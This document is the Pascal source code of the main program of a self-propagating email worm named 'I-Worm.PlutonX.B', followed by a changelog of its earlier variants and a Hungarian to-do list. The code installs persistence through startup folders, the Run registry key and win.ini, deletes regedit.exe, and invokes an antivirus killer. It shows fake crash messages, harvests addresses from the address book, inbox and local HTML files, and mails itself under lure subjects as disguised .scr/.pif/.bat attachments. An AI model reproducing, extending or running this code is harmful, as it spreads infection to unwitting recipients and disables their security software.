PROGRAM PlutonX;

USES
  sClasses IN 'ACLUnits\SCLASSES.PAS',
  Registry IN 'ACLUnits\REGISTRY.PAS',
  IniFiles IN 'ACLUnits\INIFILES.PAS',
  AclUtils IN 'ACLUnits\ACLUTILS.PAS',
  P2P      IN 'P2P.PAS',
  KillAV   IN 'KILLAV.PAS',
  LAN      IN 'LAN.PAS',
  Utils    IN 'UTILS.PAS',
  Email    IN 'EMAIL.PAS';

VAR
  EmailNum      : DWORD;
  SentEmail     : WORD;
  Emails        : TStrings;
  WABExists     : BOOL;
  Reg           : TRegistry;
  wClass        : TWndClass;
  Msg           : TMsg;
  hMainForm     : HWND;
  hMutex        : THandle;
  SendMailBusy  : BOOL;
  PlutonxRegKey : STRING;

CONST
  NumberOfErrorMessages = 12;

  Extensions1 : ARRAY [1..13] OF pChar = (
    'doc',
    'mp3',
    'xls',
    'wav',
    'txt',
    'jpg',
    'gif',
    'dat',
    'bmp',
    'htm',
    'mpg',
    'mdb',
    'zip');

  Extensions2 : ARRAY [1..3] OF pChar = (
    'pif',
    'bat',
    'scr');

  Bodys : ARRAY [1..8] OF pChar = (
    'Check the attachment!',
    'See the attachement!',
    'Enjoy the attachement!',
    'More details attached!',
    'Hi'+CRLF+CRLF+'Check the Attachement ..'+CRLF+CRLF+'See u',
    'Hi'+CRLF+CRLF+'Check the Attachement ..',
    'Attached one Gift for u..',
    'WOW CHECK THIS!');

  ErrorMessages : ARRAY [1..12] OF pChar = (
    'This File is Corrupted!',
    'This Software need more virtual memory!',
    'Error: Low System Performance!',
    'Error: Can Not Find Config.INI!',
    'This software need MSIO32.DLL!',
    'Application attempted to read memory at 0xFFFFFFFFh!',
    'The system cannot find the file specified.',
    'Stack overflow.',
    'Cannot allocate memory.',
    'A fatal exception 06 has occurred at <A900>:<A0973BFD>.',
    'Fatal Exception 0E has occurred at memory address in module Vxd IOS(04) + memory address.',
    'A fatal exception 0E has occurred at 0028:C02A0201 in VXD IOS(04)+00001FC9');

  Attachments : ARRAY [1..45] OF pChar = (
    'screensaver',
    'screensaver4u',
    'screensaver4u',
    'screensaverforu',
    'freescreensaver',
    'love',
    'lovers',
    'lovescr',
    'loverscreensaver',
    'loversgang',
    'loveshore',
    'love4u',
    'lovers',
    'enjoylove',
    'sharelove',
    'shareit',
    'checkfriends',
    'urfriend',
    'friendscircle',
    'friendship',
    'friends',
    'friendscr',
    'friends',
    'friends4u',
    'friendship4u',
    'friendshipbird',
    'friendshipforu',
    'friendsworld',
    'werfriends',
    'passion',
    'bullshitscr',
    'shakeit',
    'shakescr',
    'shakinglove',
    'shakingfriendship',
    'passionup',
    'rishtha',
    'greetings',
    'lovegreetings',
    'friendsgreetings',
    'friendsearch',
    'lovefinder',
    'truefriends',
    'truelovers',
    'fucker');

  Subjects : ARRAY[1..43] OF pChar = (
    'Greets!!',
    'Get 8 FREE issues - no risk!!',
    'Hi!',
    'Your News Alert!!',
    '$150 FREE Bonus!!',
    'Your Gift!',
    'New bonus in your cash account!',
    'Tools For Your Online Business!',
    'Daily Email Reminder!',
    'News',
    'Free Shipping!',
    'Its Easy!',
    'Warning!',
    'SCAM alert!!!',
    'Sponsors needed!',
    'New Reading',
    'CALL FOR INFORMATION!',
    '25 merchants and rising!',
    'Cows',
    'My eBay ads!',
    'Empty account!',
    'Market Update Report!',
    'Click on this!',
    'Fantastic!',
    'Wow!',
    'Bad news!!',
    'Lost & Found!',
    'New Contests!',
    'Today Only!!',
    'Get a FREE gift!',
    'Membership Confirmation',
    'Report',
    'Please Help...',
    'Stats',
    'I need help about script!!!',
    'Interesting...',
    'Introduction',
    'Various!',
    'Announcement!',
    'History screen!',
    'Correction of errors!',
    'Just a reminder!',
    'Payment notices!');

FUNCTION RandomFileName : STRING;
VAR
  S              : STRING;
  FileNameLength : BYTE;
BEGIN
  FileNameLength:=Random(10)+5;
  REPEAT
    S:=S+Chars[Random(61)+1];
  UNTIL Length(S)=FileNameLength;
  RESULT:=S+'.exe';
END;

PROCEDURE InfectStartUpDir;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders',True);
  S:=Reg.ReadString('Startup')+'\';
  IF S<>'' THEN CopyFiles(True,pChar(ApplicationName),pChar(S+RandomFileName));
  Reg.CloseKey;
END;

PROCEDURE InfectAllUsersStartUpDir;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders',True);
  S:=Reg.ReadString('Common Startup')+'\';
  IF S<>'' THEN CopyFiles(True,pChar(ApplicationName),pChar(S+RandomFileName));
  Reg.CloseKey;
END;

PROCEDURE WinIni;
VAR
  IniFile : TIniFile;
BEGIN
  IniFile:=TIniFile.Create('win.ini');
  IniFile.WriteString('Windows','Run','rundll32_.exe');
  IniFile.Free;
END;

PROCEDURE RegWinStart;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',True);
  S:=AVName[Random(SizeOf(AVName) DIV 4)];
  IF Pos('.',S)>0 THEN SetLength(S,Pos('.',S)-1);
  Reg.WriteString(S,Winpath+RandomFileName);
  Reg.CloseKey;
  CopyFiles(True,pChar(ApplicationName),Winpath+RandomFileName);
END;

PROCEDURE QuickSort(Left,Right:WORD);
VAR
  Up,Down : WORD;
  Compare : STRING;
BEGIN
  Up:=Left;Down:=Right;Compare:=Emails.Strings[(Left+Right)DIV 2];
  REPEAT
    WHILE Emails.Strings[Up]<Compare DO Inc(Up);
    WHILE Compare<Emails.Strings[Down] DO Dec(Down);
    IF Up<=Down THEN BEGIN
      Emails.Exchange(Up,Down);
      Inc(Up);Dec(Down);
    END;
  UNTIL Up>Down;
  IF Left<Down THEN QuickSort(Left,Down);
  IF Up<Right  THEN QuickSort(Up,Right);
END;

PROCEDURE KillDupes;
VAR
  I : DWORD;
BEGIN
  FOR I:=Emails.Count-2 DOWNTO 0 DO IF Emails.Strings[I]=Emails.Strings[I+1] THEN Emails.Delete(I);
END;

FUNCTION GetPlutonXRegKey : STRING;
VAR
  I    : DWORD;
  O    : WORD;
  Keys : TStrings;
  S    : STRING;
BEGIN
  Keys:=TStringList.Create;
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\SOFTWARE',False);
  Reg.GetKeyNames(Keys);

  FOR I:=0 TO Keys.Count-1 DO
    FOR O:=1 TO 480 DO
      IF(Keys.Strings[I]=Copy(AVName[O],1,Pos('.',AVName[O])-1))AND(Reg.KeyExists(Keys.Strings[I]))AND(Keys.Strings[I]<>'') THEN BEGIN
        Reg.OpenKey('\SOFTWARE\'+Keys.Strings[I],False);
        IF(Reg.ValueExists('Sent'))AND(Reg.ValueExists('email_num')) THEN S:=Keys.Strings[I];
      END;

  RESULT:=S;
  IF S='' THEN BEGIN
    RESULT:=AVName[Random(479)+1];
    IF (POS('.',RESULT)>0) THEN SetLength(RESULT,Pos('.',RESULT)-1);
  END;

  Keys.Free;
  Reg.CloseKey;
END;

PROCEDURE ReadWAB;
VAR
  WABFile : FILE;
  b,g     : DWORD;
  i       : STRING;
  n       : ARRAY[1..5] OF Char;
  xx      : ARRAY[1..500] OF Char;
  rr      : WORD;
  WABPath : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey('SOFTWARE\Microsoft\WAB\WAB4\WAB File Name',False);
  WABPath:=Reg.ReadString('');
  IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
    WABExists:=True;
    Assign(WABFile,WABPath);
    Reset(WABFile,1);
    Seek(WABFile,176199);
    REPEAT
      BlockRead(WABFile,N,5);
      IF N[1]+N[2]+N[3]+N[4]=#01+#31+#00+#03 THEN BEGIN
        BlockRead(WABFile,XX,Ord(N[5])+30);
        I:='';
        FOR RR:=1 TO Ord(N[5])+30 DO I:=I+XX[RR];
        Delete(I,1,3);
        G:=Pos(#00+#00+#00,I);
        IF G>0 THEN Delete(I,G,Length(I)-G+1);
        FOR B:=1 TO Ord(N[5]) DO IF I[B]=#00 THEN Delete(I,B,1);
        IF (Pos('@',I)>0)AND(I[1]<>'/') THEN Emails.ADD(UpperCase(I));
      END ELSE Seek(WABFile,FilePos(WABFile)-4);
    UNTIL ((FileSize(WABFile)-FilePos(WABFile))<6);
    QuickSort(1,Emails.Count-1);
    KillDupes;
  END;
  IF NOT FileExists(WABPath) THEN WABExists:=False;
  Close(WABFile);
  Reg.CloseKey;
END;

PROCEDURE WriteEmailsReg;
VAR
  I : DWORD;
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software\'+PlutonXRegKey, True);
  FOR I:=0 TO Emails.Count-1 DO BEGIN
    Str(I,S);
    Reg.WriteString(S,Emails.Strings[I]);
  END;
  Reg.WriteInteger('email_num',Emails.Count);
  Reg.WriteInteger('Sent',SenteMail);
  Reg.CloseKey;
END;

PROCEDURE ReadEmailsReg;
VAR
  I : DWORD;
  S : STRING;
BEGIN
  Emails.Add('I-Worm.PlutonX.B');
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.OpenKey('\Software\'+PlutonXRegKey, False) THEN
    FOR I:=0 TO Reg.ReadInteger('email_num')-1 DO BEGIN
      Str(I,S);
      Emails.Add(Reg.ReadString(S));
    END;
  Reg.CloseKey;
END;

PROCEDURE GetNumberOfSentEmails;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.KeyExists('\Software\'+PlutonXRegKey) THEN BEGIN
    Reg.OpenKey('\Software\'+PlutonXRegKey, True);
    SentEmail:=Reg.ReadInteger('Sent');
  END ELSE SentEmail:=0;
  Reg.CloseKey;
END;

FUNCTION FirstRun : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey('\Software',false);
  RESULT:= NOT Reg.KeyExists(PlutonXRegKey);
  Reg.CreateKey(PlutonxRegKey);
  Reg.CloseKey;
END;

PROCEDURE ReadInbox;
VAR
  OSInfo                    : TOSVersionInfo;
  Recip                     : TMAPIRecipDesc;
  MAPIMessage               : TMAPIMessage;
  lppMapiMessage            : PMapiMessage;
  MError                    : Cardinal;
  MapiSession               : DWORD;
  bFindFirst                : BOOL;
  ProfileName               : STRING;
  sSeedMessageID,sMessageID : lpup;
  I                         : BYTE;
BEGIN
  OSInfo.dwOSVersionInfoSize:=sizeof(OSInfo);
  GetVersionEx(OSInfo);
  Reg.RootKey:=HKEY_CURRENT_USER;
  IF OSInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN BEGIN
    Reg.OpenKey('Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles',False);
    ProfileName:=Reg.ReadString('DefaultProfile');
  END ELSE BEGIN
    Reg.OpenKey('Software\Microsoft\Windows Messaging Subsystem\Profiles',False);
    ProfileName:=Reg.ReadString('DefaultProfile');
  END;
  TRY
    MError:=MapiLogOn(0,PChar(ProfileName),NIL,MAPI_NEW_SESSION,0,MapiSession);
    IF (MError<>SUCCESS_SUCCESS) THEN Exit;
  EXCEPT
    ;
  END;
  bFindFirst:=True;
  FOR I:=1 TO 50 DO TRY
    IF bFindFirst THEN bFindFirst:=False ELSE sSeedMessageID:=sMessageID;
    MError:=MapiFindNext(MapiSession,0,NIL,sSeedMessageID,0,0,sMessageID);
    IF MError=SUCCESS_SUCCESS THEN BEGIN
      lppMapiMessage:=@MAPIMessage;
      MError:=MAPIReadMail(MAPISession,0,@sMessageID,MAPI_ENVELOPE_ONLY,0,lppMapiMessage);
      IF (MError=SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN WITH Recip DO Emails.Add(UpperCase(lppMapiMessage.lpOriginator.lpszAddress));
    END;
  EXCEPT
  END;
  QuickSort(1,Emails.Count-1);
  KillDupes;
  WriteEmailsReg;
  TRY
    MError:=MapiLogOff(MapiSession,0,0,0);
  EXCEPT
    ;
  END;
  Reg.CloseKey;
END;

PROCEDURE SendEmail;
VAR
  S : STRING;
BEGIN
  IF (InternetGetConnectedState(NIL,0))AND(Emails.Count>1)AND(SendMailBusy=False) THEN BEGIN
    SendMailBusy:=True;
    Inc(SentEmail);
    IF SentEmail>Emails.Count-1 THEN SentEmail:=1;
    Reg.RootKey:=HKEY_LOCAL_MACHINE;
    Reg.OpenKey('\Software\'+PlutonXRegKey,True);
    Reg.WriteInteger('Sent',SentEmail);
    Reg.CloseKey;
    S:=Attachments[Random(5)+1]+'.'+Extensions1[Random(12)+1]+'.'+Extensions2[Random(2)+1];
    CopyFiles(True,Paramstr(0),WinPath+S);
    TRY
      IF SentEmail>0 THEN Email.SendEmail(Subjects[Random(43)+1],Bodys[Random(7)+1],Emails[SentEmail],WinPath,S);
      IF FileExists(WinPath+S) THEN DeleteFile(pChar(WinPath+S));
    EXCEPT
    END;
  END;
  SendMailBusy:=False;
END;

PROCEDURE ClearEmail(S:STRING);
VAR
  B : WORD;
  C : STRING;
BEGIN
  FOR B:=Pos('@',S)+1 TO Length(S) DO
    IF ((S[B]<'a')OR(S[B]>'z'))AND((S[B]<'0')OR(S[B]>'9'))AND((S[B]<'A')OR(S[B]>'Z'))AND(S[B]<>'.')AND(S[B]<>'-')AND(S[B]<>'_') THEN BEGIN
      Delete(S,B,Length(S));
      Break;
    END;
    C:=Copy(S,1,1);
  IF ((C>='A')AND(C<='Z'))OR((C>='a')AND(C<='z')) THEN
  IF (Pos('@',S)>0)AND(Pos('?',S)=0)AND(Pos('%',S)=0)AND(Pos('$',S)=0)AND(Pos(':',S)=0)AND(Pos(' ',S)=0) THEN Emails.Add(S);
END;

PROCEDURE FindMail(EFile:AnsiString);
VAR
  F   : Text;
  E,D : WORD;
BEGIN
  IF FileExists(EFile) THEN BEGIN
    Assign(F,EFile);
    Reset(F);
    REPEAT
      ReadLn(F,EFile);
      EFile:=UpperCase(EFile);
      E:=Pos('LTO:',EFile);
      IF E>0 THEN BEGIN
        Delete(EFile,1,E+3);
        D:=Pos('"',EFile);
        IF D>0 THEN Delete(EFile,D,Length(EFile));
        ClearEmail(EFile);
      END;
    UNTIL EOF(F);
    Close(F);
  END;
END;

PROCEDURE SearchAllDirs(Path,fSpec:AnsiString);
VAR
  D     : TSearchRec;
  Error : integer;
BEGIN
  Error:=FindFirst2(Path+fSpec,faAnyFile,D);
  WHILE Error=0 DO BEGIN
    FindMail(Path+D.Name);
    Error:=FindNext2(D);
  END;
  Error:=FindFirst2(Path+'*.*',faDirectory OR faHidden,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr=faDirectory)AND(D.Name[1]<>'.') THEN SearchAllDirs(Path+D.Name+'\',fSpec);
    Error:=FindNext2(D);
  END;
END;

PROCEDURE SearchAllDir;
VAR
  I : BYTE;
BEGIN
  FOR I:=ord('c') TO ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchAllDirs(Chr(I)+':\','*.htm');
END;

PROCEDURE CopyInfectedFiles;
BEGIN
  CopyFiles(True,pChar(ApplicationName),pChar(Winpath+'rundll32_.exe'));
  InfectStartUpDir;
  InfectAllUsersStartUpDir;
END;

PROCEDURE HideProject;
BEGIN
  ShowWindow(hMainForm, SW_HIDE);
  SetWindowLong(hMainForm, GWL_EXSTYLE, GetWindowLong(hMainForm, GWL_EXSTYLE) or WS_EX_TOOLWINDOW );
  ShowWindow(hMainForm, SW_SHOW);
END;

PROCEDURE DelRegedit;
BEGIN
  IF FileExists(WinPath+'regedit.exe') THEN DeleteFile(pChar(WinPath+'regedit.exe'));
END;

PROCEDURE AVKiller;
BEGIN
  KillAV.AVKiller;
END;

PROCEDURE InitTimers;
BEGIN
  SetTimer(hMainForm,2,60000,@SendEmail);
  SetTimer(hMainForm,3,4000,@AVKiller);
END;

FUNCTION WindowProc(hWnd,Msg,wParam,lParam:Integer) : Integer; STDCALL;
BEGIN
  IF Msg=WM_DESTROY THEN PostQuitMessage(0);
  RESULT:=DefWindowProc(hWnd,Msg,wParam,lParam);
END;

FUNCTION RegisterClass2(CONST WndClass: TWndClass): ATOM; STDCALL; EXTERNAL User32 Name 'RegisterClassA';

PROCEDURE CreateMainWindow;
BEGIN
  WITH wClass DO BEGIN
    lpszClassName:='CN';
    lpfnWndProc:=@WindowProc;
    hInstance:=hInstance;
    hbrBackground:=1;
  END;
  RegisterClass2(wClass);
  hMainForm:=CreateWindow(wClass.lpszClassName,'',8000000,9000,0,0,0,0,0,hInstance,NIL);
END;

PROCEDURE StartWorm;
VAR
  FirstRun2 : BOOL;
BEGIN
  DelRegedit;
  SendMailBusy:=False;
  CreateMainWindow;
  Randomize;
  Reg:=TRegistry.Create;
  PlutonXRegKey:=GetPlutonxRegKey;
  Emails:=TStringList.Create;
  KillAV.AVKiller;
  ApplicationName:=ParamStr(0);
  IF FirstRun THEN BEGIN
    FirstRun2:=True;
    IF Pos('STARTUP',UpperCase(ApplicationName))=0 THEN MessageBox(hMainForm,ErrorMessages[Random(NumberOfErrorMessages-1)+1],'Error',MB_ICONHAND);
  END ELSE BEGIN
    InitTimers;
    FirstRun2:=False;
  END;
  InitPeerToPeer;
  HideProject;
  CopyInfectedFiles;
  WinIni;
  IF FirstRun2 THEN BEGIN
    RegWinStart;
    Emails.Add('I-Worm.PlutonX.B');
    SearchAllDir;
    ReadWab;
    ReadInBox;
  END ELSE BEGIN
    GetNumberOfSentEmails;
    ReadEmailsReg;
    ReadInBox;
  END;
  hThread:=BeginThread(NIL,0,@RunThread,NIL,0,ThreadId);
END;

BEGIN
  hMutex:=CreateMutex(NIL,False,'I-Worm.PlutonX.B');
  IF WaitForSingleObject(hMutex,0)<>wait_timeout THEN StartWorm;
  WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
END.

//History
//
//I-WORM.SOLTERN.E:
// - New Bigman File
// - ?,%,$,: Caracters Detection In Email Adresses
// - Check Morpheus Software Exists
// - Timer Disabled On First Run
// - Hide Aplication Name In Main Form
//
//I-WORM.SOLTERN.F:
// - Only One Virus Can Start
// - Infect Startup Directories
// - Infect win.ini
// - New Icon
// - Kazaa Registry Bug Fixed
// - BigMan File Removed
// - Delphi 4 Compatible
//
//I-WORM.SOLTERN.G:
// - LAN Infection (With TThread)
// - Morpheus II and Kazaa 2.0 support
// - AV Killer (Detect 478 AntiVirus Softwares)
// - Support eDonkey 2000, XoloX, Shareaza, LimeWire
// - Random File Names
// - NO Error Message When Worm Run In StartUp Dir
// - Random Error Messages
// - Random Registry Keys
// - Random DNS
//
//I-WORM.SOLTERN.H:
// - Small .EXE Size
// - New Email Sender Procedure
// - Poly MIME Header
// - Poly Iframe
// - Delete Regedit.exe
//
//TERVEK:
// - Exe fertozes (Binder)
// - File meret veletlenszeru valtoztatasa
// - File Search + Clone in shared folders
// - Registry allando csekkolasa
// - MSN Fertozes
// - Kepernyovedo megfertozese
// - Titkositott string-ek
